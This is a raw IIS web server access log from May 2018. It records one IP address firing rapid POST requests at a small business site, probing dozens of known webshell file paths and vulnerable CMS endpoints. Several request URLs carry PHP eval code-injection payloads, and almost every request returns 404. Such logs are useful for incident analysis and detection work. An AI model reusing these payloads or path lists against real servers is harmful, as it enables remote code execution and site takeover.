#Software: Microsoft Internet Information Services 7.5
#Version: 1.0
#Date: 2018-05-03 08:31:53
#Fields: date time cs-method cs-uri-stem cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-bytes cs-bytes
2018-05-03 23:46:14 POST /utility/convert/data/config.inc.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/utility/convert/data/config.inc.php 404 1405 697
2018-05-03 23:46:14 POST /admin.php/module/action/param1/${@eval($_POST[c])} - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin.php/module/action/param1/${@eval($_POST[c])} 404 1405 730
2018-05-03 23:46:14 POST /admin.php/module/action/param1/${@eval($_POST[c])} - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin.php/module/action/param1/${@eval($_POST[c])} 404 1405 1184
2018-05-03 23:46:14 POST /admin.php/module/action/param1/${@eval($_POST[c])} - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin.php/module/action/param1/${@eval($_POST[c])} 404 1405 733
2018-05-03 23:46:14 POST /code/mp.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/code/mp.php 404 1405 645
2018-05-03 23:46:14 POST /weki.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/weki.php 404 1405 639
2018-05-03 23:46:14 POST /md5.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/md5.asp 404 1405 1090
2018-05-03 23:46:14 POST /images/swfupload/images/uploadye.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/swfupload/images/uploadye.php 404 1405 702
2018-05-03 23:46:14 POST /dxyylc/md5.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/dxyylc/md5.php 404 1405 650
2018-05-03 23:46:14 POST /ckeditor/plugins/pagebreak/images/inCahe.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/ckeditor/plugins/pagebreak/images/inCahe.php 404 1405 716
2018-05-03 23:46:14 POST /plus/sky.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/sky.php 404 1405 646
2018-05-03 23:46:14 POST /lent.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/lent.php 404 1405 638
2018-05-03 23:46:14 POST /plus/e7xue.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/e7xue.php 404 1405 654
2018-05-03 23:46:14 POST /plus/laobiao.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/laobiao.php 404 1405 654
2018-05-03 23:46:14 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=8080 404 1405 678
2018-05-03 23:46:14 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=8080 404 1405 1132
2018-05-03 23:46:14 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=8080 404 1405 681
2018-05-03 23:46:14 POST /90.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/90.asp 404 1405 1089
2018-05-03 23:46:14 POST /install/modurnlecscache.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/install/modurnlecscache.php 404 1405 684
2018-05-03 23:46:14 POST /dxyylc/md5.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/dxyylc/md5.asp 404 1405 1104
2018-05-03 23:46:15 POST /images/class.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/class.asp 404 1405 1111
2018-05-03 23:46:15 POST /utility/convert/data/config.inc.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/utility/convert/data/config.inc.php 404 1405 692
2018-05-03 23:46:15 POST /wap/wap.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/wap/wap.php 404 1405 647
2018-05-03 23:46:15 POST /plus/90sec.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/90sec.php 404 1405 654
2018-05-03 23:46:15 POST /test.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/test.php 404 1405 638
2018-05-03 23:46:15 POST /login_wall.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/login_wall.php?login=cmd 404 1405 673
2018-05-03 23:46:15 POST /login_wall.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/login_wall.php?login=cmd 404 1405 1127
2018-05-03 23:46:15 POST /login_wall.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/login_wall.php?login=cmd 404 1405 676
2018-05-03 23:46:15 POST /images/class.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/class.php 404 1405 657
2018-05-03 23:46:15 POST /data/404test.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/404test.php 404 1405 655
2018-05-03 23:46:15 POST /11m.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/11m.php 404 1405 638
2018-05-03 23:46:15 POST /1.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/1.php 404 1405 632
2018-05-03 23:46:15 POST /plus/90sec.php/plus/90sec.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/90sec.php/plus/90sec.php 404 1405 684
2018-05-03 23:46:15 POST /languages/zh_cn/convert/shopex49.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/languages/zh_cn/convert/shopex49.php?license_id=assert 404 1405 742
2018-05-03 23:46:15 POST /languages/zh_cn/convert/shopex49.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/languages/zh_cn/convert/shopex49.php?license_id=assert 404 1405 1196
2018-05-03 23:46:15 POST /languages/zh_cn/convert/shopex49.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/languages/zh_cn/convert/shopex49.php?license_id=assert 404 1405 745
2018-05-03 23:46:15 POST /data/config_data.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/config_data.php 404 1405 662
2018-05-03 23:46:15 POST /2016/gou.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/2016/gou.php 404 1405 651
2018-05-03 23:46:15 POST /5t/css/mp.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/5t/css/mp.php 404 1405 649
2018-05-03 23:46:15 POST /i.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/i.php 404 1405 633
2018-05-03 23:46:15 POST /plus/ad_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/ad_js.php?aid=9090 404 1405 672
2018-05-03 23:46:15 POST /plus/ad_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/ad_js.php?aid=9090 404 1405 1126
2018-05-03 23:46:15 POST /plus/ad_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/ad_js.php?aid=9090 404 1405 675
2018-05-03 23:46:15 POST /api/newfile.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/api/newfile.php? 404 1405 654
2018-05-03 23:46:15 POST /api/newfile.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/api/newfile.php? 404 1405 1108
2018-05-03 23:46:16 POST /api/newfile.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/api/newfile.php? 404 1405 657
2018-05-03 23:46:16 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=9527 404 1405 679
2018-05-03 23:46:16 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=9527 404 1405 1133
2018-05-03 23:46:16 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=9527 404 1405 682
2018-05-03 23:46:16 POST /index.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php 404 1405 640
2018-05-03 23:46:16 POST /index.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D 404 1405 750
2018-05-03 23:46:16 POST /index.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D 404 1405 1204
2018-05-03 23:46:16 POST /index.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D 404 1405 753
2018-05-03 23:46:16 POST /fuck.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/fuck.php 404 1405 641
2018-05-03 23:46:16 POST /cache/cachee.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/cache/cachee.php 404 1405 654
2018-05-03 23:46:16 POST /yp/product.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}} 404 1405 728
2018-05-03 23:46:16 POST /yp/product.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}} 404 1405 1182
2018-05-03 23:46:16 POST /yp/product.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}} 404 1405 731
2018-05-03 23:46:16 POST /About/newfile.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/About/newfile.php 404 1405 656
2018-05-03 23:46:16 POST /include/data/words/words.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/include/data/words/words.php 404 1405 686
2018-05-03 23:46:16 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=6022 404 1405 674
2018-05-03 23:46:16 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=6022 404 1405 1128
2018-05-03 23:46:16 POST /plus/mytag_js.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/mytag_js.php?aid=6022 404 1405 677
2018-05-03 23:46:16 POST /index.php/Index/index/name/${@eval($_POST[c])} - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php/Index/index/name/${@eval($_POST[c])} 404 1405 722
2018-05-03 23:46:16 POST /index.php/Index/index/name/${@eval($_POST[c])} - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php/Index/index/name/${@eval($_POST[c])} 404 1405 1176
2018-05-03 23:46:16 POST /index.php/Index/index/name/${@eval($_POST[c])} - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php/Index/index/name/${@eval($_POST[c])} 404 1405 725
2018-05-03 23:46:16 POST /test.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/test.php 404 1405 641
2018-05-03 23:46:16 POST /news/2016/gou.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/news/2016/gou.php 404 1405 661
2018-05-03 23:46:16 POST /data/#data.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/%23data.asp 404 1405 1108
2018-05-03 23:46:17 POST /SqlIn.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/SqlIn.asp 404 1405 1094
2018-05-03 23:46:17 POST /SqlOut.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/SqlOut.asp 404 1405 1097
2018-05-03 23:46:17 POST /data/data.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/data.asp 404 1405 1102
2018-05-03 23:46:17 POST /css.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/css.asp 404 1405 1092
2018-05-03 23:46:17 POST /config/AspCms_Config.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/config/AspCms_Config.asp 404 1405 1124
2018-05-03 23:46:17 POST /inc/config.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/config.asp 404 1405 1104
2018-05-03 23:46:17 POST /9tu.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/9tu.asp 404 1405 1094
2018-05-03 23:46:17 POST /11m.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/11m.asp 404 1405 1092
2018-05-03 23:46:17 POST /admin/index.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin/index.asp 404 1405 1107
2018-05-03 23:46:17 POST /conn1.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/conn1.asp 404 1405 1098
2018-05-03 23:46:17 POST /concon.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/concon.asp 404 1405 1096
2018-05-03 23:46:17 POST /UploadFile/index.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/UploadFile/index.asp 404 1405 1116
2018-05-03 23:46:17 POST /bsm.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/bsm.asp 404 1405 1093
2018-05-03 23:46:17 POST /inc/config.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/config.asp 404 1405 1108
2018-05-03 23:46:17 POST /admin/Databackup/1.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin/Databackup/1.asp 404 1405 1120
2018-05-03 23:46:17 POST /images/img.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/images/img.asp 404 1405 1106
2018-05-03 23:46:17 POST /inc/myql.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/myql.asp 404 1405 1101
2018-05-03 23:46:17 POST /a.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/a.asp 404 1405 1086
2018-05-03 23:46:17 POST /Images/cache.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/cache.asp 404 1405 1114
2018-05-03 23:46:17 POST /css/css.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/css/css.asp 404 1405 1100
2018-05-03 23:46:17 POST /inc/config.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/inc/config.asp 404 1405 1105
2018-05-03 23:46:17 POST /jiuge.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/jiuge.asp 404 1405 1099
2018-05-03 23:46:17 POST /ver.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/ver.asp 404 1405 1090
2018-05-03 23:46:17 POST /Templates/red.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Templates/red.asp 404 1405 1112
2018-05-03 23:46:18 POST /config/AspCms_Config.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/config/AspCms_Config.asp 404 1405 1124
2018-05-03 23:46:18 POST /struts2-showcase/filedownload/index.action - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/struts2-showcase/filedownload/index.action 404 1405 708
2018-05-03 23:46:18 POST /struts2-showcase/filedownload/index.action - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/struts2-showcase/filedownload/index.action 404 1405 1162
2018-05-03 23:46:18 POST /struts2-showcase/filedownload/index.action - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/struts2-showcase/filedownload/index.action 404 1405 711
2018-05-03 23:46:18 POST /info1.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/info1.php 404 1405 640
2018-05-03 23:46:18 POST /index.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.asp 404 1405 1097
2018-05-03 23:46:18 POST /UserFiles/x.aspx - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/UserFiles/x.aspx 500 3266 657
2018-05-03 23:46:18 POST /UserFiles/x.aspx - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/UserFiles/x.aspx 500 3266 1111
2018-05-03 23:46:18 POST /UserFiles/x.aspx - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/UserFiles/x.aspx 500 3266 660
2018-05-03 23:46:18 POST /Images/MyFiles/x.aspx - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/MyFiles/x.aspx 500 3266 667
2018-05-03 23:46:18 POST /Images/MyFiles/x.aspx - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/MyFiles/x.aspx 500 3266 1121
2018-05-03 23:46:19 POST /Images/MyFiles/x.aspx - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/Images/MyFiles/x.aspx 500 3266 670
2018-05-03 23:46:19 POST /utility/convert/data/config.inc.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/utility/convert/data/config.inc.php 404 1405 694
2018-05-03 23:46:19 POST /data/cache/fuck.php.parse_search_.inc - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/cache/fuck.php.parse_search_.inc 404 1405 696
2018-05-03 23:46:19 POST /data/cache/fuck.php.parse_search_.inc - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/cache/fuck.php.parse_search_.inc 404 1405 1150
2018-05-03 23:46:19 POST /data/cache/fuck.php.parse_search_.inc - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/data/cache/fuck.php.parse_search_.inc 404 1405 699
2018-05-03 23:46:19 POST /sitemap/templates/met/SqlIn.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/sitemap/templates/met/SqlIn.asp 404 1405 1138
2018-05-03 23:46:19 POST /config/AspCms_Config.asp - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/config/AspCms_Config.asp 404 1405 1126
2018-05-03 23:46:19 POST /admin/uploadfiles/Hzllaga_Getshell.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/admin/uploadfiles/Hzllaga_Getshell.php 404 1405 703
2018-05-03 23:46:19 POST /plus/moon.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/plus/moon.php 404 1405 648
2018-05-03 23:46:19 POST /sqzr.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/sqzr.php 404 1405 641
2018-05-03 23:46:19 POST /index.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?m=formguide&c=index&a=show&formid=1&siteid=1 404 1405 730
2018-05-03 23:46:19 POST /index.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?m=formguide&c=index&a=show&formid=1&siteid=1 404 1405 1184
2018-05-03 23:46:19 POST /index.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/index.php?m=formguide&c=index&a=show&formid=1&siteid=1 404 1405 733
2018-05-03 23:46:19 POST /login.php - 162.247.96.227 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1) http://kaiparatavern.co.nz/login.php?login=cmd 404 1405 663
